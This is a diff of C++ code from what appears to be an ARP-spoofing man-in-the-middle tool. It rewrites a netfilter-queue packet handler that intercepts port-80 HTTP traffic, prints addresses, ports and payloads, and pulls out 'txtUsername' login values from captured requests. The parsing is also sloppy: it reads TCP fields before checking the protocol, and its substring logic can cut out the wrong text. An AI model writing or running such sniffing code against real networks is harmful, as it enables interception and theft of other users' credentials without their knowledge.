@@ -333,7 +333,7 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
 
 static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
 {
-    unsigned char *packet;
+    char *packet;
     int id = 0;
     struct nfqnl_msg_packet_hdr *ph;
     ph = nfq_get_msg_packet_hdr(nfa);
@@ -341,27 +341,26 @@ static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, s
     {
         id = ntohl(ph->packet_id);
     }
-    int ret = nfq_get_payload(nfa, &packet);
+    int ret = nfq_get_payload(nfa, reinterpret_cast<unsigned char **>(&packet));
     if (ret >= 0)
     {
         struct iphdr *ip_header = (struct iphdr *)packet;
-        if (ip_header->protocol == IPPROTO_TCP)
+        struct tcphdr *tcp_header = (struct tcphdr *)(packet + ip_header->ihl * 4);
+        if (ip_header->protocol == IPPROTO_TCP && ntohs(tcp_header->dest) == 80)
         {
-            struct tcphdr *tcp_header = (struct tcphdr *)(packet + ip_header->ihl * 4);
-            if (ntohs(tcp_header->dest) == 80)
+            // HTTP packet
+            cout << "HTTP packet" << endl;
+            cout << "Source IP: " << inet_ntoa(*(struct in_addr *)&ip_header->saddr) << endl;
+            cout << "Destination IP: " << inet_ntoa(*(struct in_addr *)&ip_header->daddr) << endl;
+            cout << "Source Port: " << ntohs(tcp_header->source) << endl;
+            cout << "Destination Port: " << ntohs(tcp_header->dest) << endl;
+            cout << "Payload: " << endl;
+            cout << packet + ip_header->ihl * 4 + tcp_header->doff * 4 << endl;
+            string payload = packet + ip_header->ihl * 4 + tcp_header->doff * 4;
+            if (payload.find("txtUsername") != string::npos)
             {
-                // HTTP packet
-                cout<< "HTTP packet\n";
-                char *http_content = (char *)(packet + ip_header->ihl * 4 + tcp_header->doff * 4);
-                string http_content_str(http_content);
-                // find the packet with "txtUsername"
-                if (http_content_str.find("txtUsername") != string::npos)
-                {
-                    cout << "HTTP POST packet with username: " << http_content_str << endl;
-                }
-
+                cout << "Username: " << payload.substr(payload.find("txtUsername") + 12, payload.find("&") - payload.find("txtUsername") - 12) << endl;
             }
-
         }
     }
     return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
